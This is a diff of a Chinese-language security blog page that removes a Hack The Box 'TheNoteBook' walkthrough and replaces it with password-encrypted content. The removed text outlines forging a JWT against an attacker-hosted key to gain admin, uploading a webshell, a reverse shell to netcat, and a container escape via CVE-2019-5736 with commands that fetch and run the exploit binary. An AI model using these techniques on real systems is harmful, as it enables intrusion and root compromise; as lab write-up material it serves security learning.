@@ -21,36 +21,18 @@
   </script>
 
 
-  <meta name="description" content="web枚举">
+  <meta name="description" content="还没retired呢 (✿◡‿◡)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HTB:TheNoteBook">
 <meta property="og:url" content="http://evilarsene.icu/2021/03/15/HTB-TheNoteBook/index.html">
 <meta property="og:site_name" content="Love ❤ Hacking">
-<meta property="og:description" content="web枚举">
+<meta property="og:description" content="还没retired呢 (✿◡‿◡)">
 <meta property="og:locale">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/1.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/2.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/3.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/4.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/5.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/6.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/7.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/8.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/9.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/10.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/11.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/12.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/13.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/14.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/15.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/16.png">
-<meta property="og:image" content="http://evilarsene.icu/images/TheNoteBook/17.png">
 <meta property="article:published_time" content="2021-03-14T16:04:59.000Z">
-<meta property="article:modified_time" content="2021-05-17T19:56:40.323Z">
+<meta property="article:modified_time" content="2021-06-23T09:42:45.076Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Linux靶机">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://evilarsene.icu/images/TheNoteBook/1.png">
 
 <link rel="canonical" href="http://evilarsene.icu/2021/03/15/HTB-TheNoteBook/">
 
@@ -240,7 +222,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-18 03:56:40" itemprop="dateModified" datetime="2021-05-18T03:56:40+08:00">2021-05-18</time>
+                <time title="修改时间：2021-06-23 17:42:45" itemprop="dateModified" datetime="2021-06-23T17:42:45+08:00">2021-06-23</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -263,62 +245,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/TheNoteBook/1.png" alt="1"></p>
-<p>web枚举</p>
-<p><img src="/images/TheNoteBook/2.png" alt="2"></p>
-<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>注册页面可以注册用户，注册完之后返回了JWT Token</p>
-<p><img src="/images/TheNoteBook/3.png" alt="3"></p>
-<p>token的内容</p>
-<p><img src="/images/TheNoteBook/4.png" alt="4"></p>
-<p>发现了3个线索</p>
-<ul>
-<li>验证的加密算法为RS256</li>
-<li>HEADER部分似乎存在privKey.key的地址</li>
-<li>PAYLOAD部分admin_cap疑似权限设置</li>
-</ul>
-<p>和SHA-256的HMAC不同，这里私钥地址应该可控，所以我们应该可以修改权限参数，并修改私钥地址为自己可控，使得请求合法</p>
-<p>生成RSA 256密钥对</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out rsa_private.pem 2048	#私钥</span><br><span class="line">openssl rsa -in rsa_private.pem -outform PEM -pubout -out rsa_public.pem	#公钥</span><br></pre></td></tr></table></figure>
-
-<p>修改私钥地址和管理员权限，并加上签名</p>
-<p><img src="/images/TheNoteBook/5.png" alt="5"></p>
-<p>替换cookie，之后开启简单http服务，上面放上私钥，让对方访问自己的私钥，使得签名验证合法</p>
-<p>刷新页面，我们就是管理员了</p>
-<p><img src="/images/TheNoteBook/6.png" alt="6"></p>
-<p>后台文件上传</p>
-<p><img src="/images/TheNoteBook/7.png" alt="7"></p>
-<p>Behinder连接</p>
-<p><img src="/images/TheNoteBook/8.png" alt="8"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>webshell会被定时清理，还是反弹bash到netcat</p>
-<p>用户noah</p>
-<p><img src="/images/TheNoteBook/9.png" alt="9"></p>
-<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p><img src="/images/TheNoteBook/10.png" alt="10"></p>
-<p>之前留言板提示了backup</p>
-<p><img src="/images/TheNoteBook/11.png" alt="11"></p>
-<p>发现了ssh的私钥</p>
-<p><img src="/images/TheNoteBook/12.png" alt="12"></p>
-<p>登录</p>
-<p><img src="/images/TheNoteBook/13.png" alt="13"></p>
-<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>sudo权限的docker命令</p>
-<p><img src="/images/TheNoteBook/14.png" alt="14"></p>
-<p>查看docker和runC版本</p>
-<p><img src="/images/TheNoteBook/15.png" alt="15"></p>
-<p>容易受到CVE-2019-5736攻击，这里需要先开启并进入容器，然后等外部root调用容器，这样payload才会被触发</p>
-<p>修改payload</p>
-<p><img src="/images/TheNoteBook/16.png" alt="16"></p>
-<p>编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED&#x3D;0 GOOS&#x3D;linux GOARCH&#x3D;amd64 go build main.go</span><br></pre></td></tr></table></figure>
-
-<p>之后的操作需要两个终端</p>
-<p>终端1里:开启容器，拷贝kali上编译好的exp到容器上，赋予x权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;docker exec -it webapp-dev01 &#x2F;bin&#x2F;bash</span><br><span class="line">curl ... -o main</span><br><span class="line">chmod +x main</span><br><span class="line">.&#x2F;main</span><br></pre></td></tr></table></figure>
-
-<p>在终端1运行exp后，终端2立即调用sh</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;docker exec -it webapp-dev01 &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
-
-<p>之后就能获得反弹shell</p>
-<p><img src="/images/TheNoteBook/17.png" alt="17"></p>
-
+        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="1c34c165647a437817ba81a80e27f4fb607c5d0947104f862e38d198df319e61">b524b83cd16cbe249c57e5ded9e0bafd71ad68fa7a498dce7b90b3730c6cc52991dd2cfe69375473f8d62b311cd85143b1d995c53e267635c7277e99453640c7535a38c69ce35caba68017128dced7de8e81a57aabebeff1c2c529fa5679f247b69364267d285d5380d212b4dbaf4643233a864fab7792fbc3116dd6398e880d0f441333a55a277ded140f3e220f072de01c75553c87d792e7aee32b2dd9aa39325fe7f5b4770d7a3a2906569cdbb5c7ea9afbe62d503b9c22140d28d1da34accedce6bd1e56f2ff2d238b4e117f47ea07248fceb477173b2f4ed11d0bdc50d30a63d02f23f8e5d598c25261dc98200ba19fa1a5aed9b5981100378680a31abf7eb4bfee8f2aad9ff81a0a262a5b8042a246ba9d17861b301082232aa07540b5c252bb1f333b4fbec92aa8f86e31b23589ff3480b700fc16886136e943658ac53ee072866751f4fbc4c16e3dd6301da50ccf84153c241a2556892e9270bf371cbb9f26b56e672653bb501da630b86a35860aca446ed2c73b1a116547728be1bffbecec843d1e9c856709a4bd4bdcacd809aea8cd132ad3f1c9c43568b481e63e145566c0c9b91cb7434e91bf43baad0df5230d25d4493a8ccd97593502f703bdd28a6f62c01b1c1209e98eb0f4f1bcf6a05033345e1f5e059ad5edc73be1c67487224281248a5f9c9efe7b08904bcc226de0c3438ebceb461362488cd8aeac1b394173c37064daf7df7b46d9ee006cc9278de210c345b5fd31070101e01b8b34bc547027e20fd09bff90a3677ebff51671f8e51af43a11993bd758afeb560b02197790a8c462335432893e5ce59b683a89eab41c32f38fe3232cc57c2234d8b26e73d7337d2e834c5279c8353c1909f6dcb1570eb5e93c5664eedc90a922c07c202227ed6ee99380fa51b940b655e588eedfd8f2485fd9b4f4af0bf6aeac01cb4b5b81b0655965a3c8397ccae8037105147d63c83f1b6c50852013fb79299d163cf7747da2ba98c4b85c4ca8fff60dd200cbc425d9ffdae13525dba9d5f16ed70bcf38dcfdc0e4532cac778ca3f7ffb385b1af414038e195e66053111285292b2eaed5b3d2958a5c741c122be1510210e3c46054793e74718cbdd5c529aade416b03a9e2e12c4e06585faa620a49a5edd23d6f33864eeced65670b246c17e2ca477febebc90469be6c05ff90e773ba758bdd084ac3d8487a3a3c1bfdd5ed14487f8cd6bed4152919a469ee4a3406a29362a4bc24879d3cd82df7af5e148f260cc1d10eeeafefc5bf28b0af15f9882a1a76d38c79af2aa4588873fdbe73ef7c4470b87ee7e48f99e7f52c4f87fcac6a8067688fa10e4caefb7422f2aa6264a581cf09e0dcf5145d2fe3f674697cddf4bd6ee403947c7c7d3354669932b3342b840a4217e3ecbdb92a6c4b731643e87adcc68efcceb1554cf93be69f9953479c18f40d7ea85803b133f6a6e2fda314f0e4e9dbcb7d54ebae2c4dba2da6b9d3c77f996fe54d19d2c5b302499ca4418f999e2b45d81bbcb4ea6c29988ac1f76c5fdd4d6e546db8a1267edafaa4dd96269d7f30dca586629ed76c4ba272a576d70a9b47997229fe92cd04ed390fdbfdabe368efc7c1b5b0c3c1b599aade7c35a3d430e215b00ff9e97601ee77785d03eb893832c69d9b1d0621f9703b2c35ea43f1a0feeaa18aae63643517039261533061b3c28d3a31bc5c547e0e7f9637d3f2c666a5a45b9492c12fd96578291e5ab2fbde68720f69e7bafa276c9201aae38d564818d0cec707de87a53d723c9057486d75ee328a7f4bca944199cf0d561820fdffd87a73cd2637f5b658228211fb54335be3b54e3853e8d1631e91f5b233162519cc118a146e6e3f5f0c45b19c6a3abd9f3beefcb8ccae99fe3dec72fdaabba00a9a202a79730339806cf6d992437044aa694ca182f3d685600367ae3583b41745504c8998ddce6de2a59cef8e54b1ce8da318d87853400734f835900b6b5c2f11027f7d3c5bb5367ffdd8a3ff9c7958db4d63d6d89298531f18df485f9e1cf508c91c276a60eba4cbfc7319678cf4c27feade73bb190be39ef3704d60356bcd3d5123198c85b8eea6f25731ef568ab10ec88a553623f60d5e2771a3f32e58ab0aacfa4a7969b2ecc4b13105dd0f43047eaea04c420936f687c059866cb4a069dfba0a63d3ca93a90d77f2709b5a2352fddae7aad7fb5762e370bf25907ee3947b6bc0c3efbf017bf30bc677b713ebb8036a38be502d15e89495d7f85d8a84e4fbddb970f05edd02419c72b56f4df8bd8d862ce568ccf33ab85e7c84230ed6698aaf11b8dea805d2532d9a1cd89ee8bda8ceab9db57abbafbb30170757d54532a68e2937b572f0baecf501cc0df733260cc182a2ed4dfc30df7ff8cd702dd07dba3613656cee62f2ae5fb8dcc41d67566146c2dae4d6029194d01c0c03f35ee7c745f81575518afedb7635a149d27d504cf9d3ea9ad2cf0b1338f854c67fd4913fbc3b7a52c3c530399f9a12685f92a0dc5ce6d54f689c6cbdfbf99245ec9c1e4eed40438d9bdf00484bb0fa660395a6bd0847b34574fcfb47d57c4c8eeccae2792d57935fb3b310bcba13f418ef40c6c0db602826fbc4a89ccd0a663730f67244e10ae1a40d9fcc3eda6f58242f0705f0ce6eb90c5b477174c4f5981b11b568beb7bbd7fad1236d2e290ba310fedf3f91c80c304b797419443e5c55b65fcab6e751d1f51a6f79e58530a37554ea138c926575ff48c6b61aac98660deaf29b60036554de30fa19da141f08530069cd26c4b63ebb1408b1ab25204f4ae7779e758543bd844ae034b456d8237d77990a339ebdaef18f8d3141041736c7017611cd15dd183e0e8fb8c6f9ba7c98a8ea713f7dec3143b4d464dee51b3c3242865ed1fd719d4fcf6015f3684020655f4682fceb9c1fe1375fdd02053d24cf9f5cac20ae71f2794a74d4b77d2647b56028197dc47cd7bab7bfd007168f2aae0dd2dc59911584365288a1b9fcbfa99c234068f6cde3f691aa9063660e84702a14a62b545c775634a782aabaad46cb387e47ecda52d67b745ad4e2e953424095680174e0600111f4d3ab1d14d0830928f373fa4c1e887438c4792423ecf5ed5ed243fa4d78c4630f3c1753231a76615eb954464136c6036cb76f70bcf13a50f0755d8de8629df0ddf4f0911473ccb0699581781d3b2d2d280948469383667b9a1c881d88f8f409fa274e279e5fa7c7fbfac0f4983a70216247789cf7a60176f44ad2a688d570d2c167e710d1974b62e82f78fe6919909c9816da6a508745998e873cdbc00ae75c69ec277df9382fc6a80ba80df113047ec0f9cad20edda13786e80331d4b1c6af98635b246923228a437155fb3d902fa8a821d016cd626802617b60b5d0d6a57daf13117c7d199b7c861d1833a544f2bca47570d8ea389162dfaf6f6b024d5d841998b52145675b17e918af512fce98c5200cdaf3f73d7d1d0e8c0de78f665ab54a5d73c615527446ac53f7a7fd3a65a7aab7acaec73e3b00573fc35db72d39a41c30bd9babec62f786314dc08cc2d93fe84451f3ba45f0c770abc75a969cdf576403444df381c019c71514bc6d6aa99bfe99ded3cb90cc99083af6a500d20033c829ca89abf3a28e4469f94adb4df7870add601ba42cf1180f12c810bbaf69abde7b3689e26f7f0a96b22ced6335e86b5bfea466227a67e522e72d93c61f7e551d2f5cddb28d8245c11c2835e1c08fb1df9de48c30f9e0baf773ef293e71d653f40abd81e80751d371906c78c28299042b65a5daf5312ff018423f05dee388375b9391810fa387e47ba0b8c7e7a7d20ce01b87439520bdd9991778a3c8399f602704b06de0485f6e0a5583e2af7609fe9c3497d5ef3df61b039379adcf9206e6e818e8437cf7e238d59b4731716eba6389fa9c92aac7794aaec18b62658905a856a6932c0650e75081246a5c7e176acb5d0b1700855935ad57673ae3c8792b420e3cd2126f9b6f0295cef70d425d461ea6dddaa676f4b5f4d7653d8da61261024191b698f1cc177b645249a40ffcf1fade942270baf6eafddfe8b4fad2d84a7a53c019c9c11542539a22a87a0d884201902b444b77df4f230cbf29b0138bc677052706832183b8ea122d1a5be1f0181a66db340c2e4db64590dda7b6395d845719aad12e81eee62ca7912b7312e8c1509b4cfd4d2f83a3b8c68042796ef3d09d7cfc4328373b8e4973d074cc1cbe77fc076e45c7eb0d8f7539c50f016eac0a1ecb722cea808c28a401ca6fc1b056090eba128d0fca57d09f67935ec3dc8d0e95f61fa1366864db0a9039ec46ddab80fe97dab7b0f041d6b21a400e0e07fab7168ffe8940159ed4c45abc6b660d546825a38577d8f454d67602bf812a8f916edc03ade114c3e16ef5098cc9b2820fe8240fb57fcd129a1c691667e1bbf19210ccf62c2dcb2d4b65e78ccb4b05491cf541a9a3250fb89eacb7b38562ba5cc083725cfce8370d4854c1673b591fa52f7539811d5427322c9bbe629f52cf49f6bb249517fb13483ad53cda7132cc1fb69e2e5b8408b625425e8b63281b5f1dfc3ba748ca7e00a3e9b55c6cc627b72a4fabb0ab19d30644b29f2691983126e1c4b7f2581d90bf3b2bbdb2694296efb8796c8879cf32111573a189ce31a8394f780796a5368606c19a00c59912ea7c7d89cfd43e71115587baddcb3a7eb95785dd54cf231ecbe9c7680f0c636042c7799ddd208838dee405ede989708b69b39e220a6783c846b945cc5bc60b6e9bcc8d4a14cd3ab8851f903725714a3f4b814cad372c4374d541636914061b2c68163d1fae39385bf38625390a0e39efef3bf9c514d160fcb1fb7a263a84fb7db2c7c58efddb33e23adc316b78e95820fe82f5a7ead57b665b07b698dee6ef597e557d8331203559968837755fec43abed8725b3db386cdb62856cb507f2c5ad3ad8e8f513e7a6a9e6cf39f2e7083f301807faf397b6fd1fa660e75f38e9eee58c9c16ec187bd1df2f2e87124af30b72c4294c5353ec0d4298e38351a8174d67ed9bae9a0c2e8920a67bc7fc714b460de02e717a0a6c6e3da3ac2071f46c06b705fc39b479972e26669c623ee3c0af68ab6424c1ba10472ac8e0c0f492845d2a42b94b60ddce185594680d0ddd48e7c97094441f7c09a931f061f755e34ccc2b946abe6085502e063272900b5a0d6e220403e71a7aa8c938d62e18d30f3a2e188331af7acd1cb4aa4aeb2955076dc75352bf4b2a951e5412deba9755fb13182d5c706d1a188f1ca56627604a6a60f2f27b9b3bd0f9d226682dc8bdd89872c3f84d33301d0e3a0eaf01b2c2cb57c631dd7fe32b22a52350454ec1de4920ae72120204471f92e425bfeef985c95603edb990cdb450424368728dab91c0f63af4ceaa2b6d5c740db168e113f527270f0b49730fe8954d61027a3d1b2ff4a4662d62a31983a9f32fcd890e40ef7e367f91538f9bf2178d1fcce3b5e589bc322863e105faaac863451a99565da424490683ed6bbdef0332ea5427cb76f7e50ed00b6c8ee190b08c18d1dca19424bcfbed8725aaa9435805d343df14ecf8cfca4c0bc4f7fdb34fb7da909184d619240472e8de3376613fe324dfba0a6839c08ebd9a236e717f232cfc301ea76a880f4db1de3b7a01de85c8ba29e48bd3c5b9549df3bd82bd00f1bf21fd4b9e179214fef663fbe85aeded320b536c29daee8bd0fa7ef5f8b9833be323f17264fd3a8137e14af32a9fb62cf2169e61d14ae176dbf7b0bad7a26587165429a8590c7b99254be5932930051fd4e6ebda6710c671f1dc76cdd5790827dcb343ee2fc15fc642694ee3e0415ff7730c001eee327ffeddd78326b9c795e367a9df7983d715ba42542ec871a8e8b66be4a6e301a33477eb38dd2087f210b7a9da27f34c11234b654615821dadd784</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">root hash</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -401,7 +339,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#user"><span class="nav-number">3.1.</span> <span class="nav-text">user</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root"><span class="nav-number">3.2.</span> <span class="nav-text">root</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -417,14 +354,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">169</span>
+          <span class="site-state-item-count">170</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
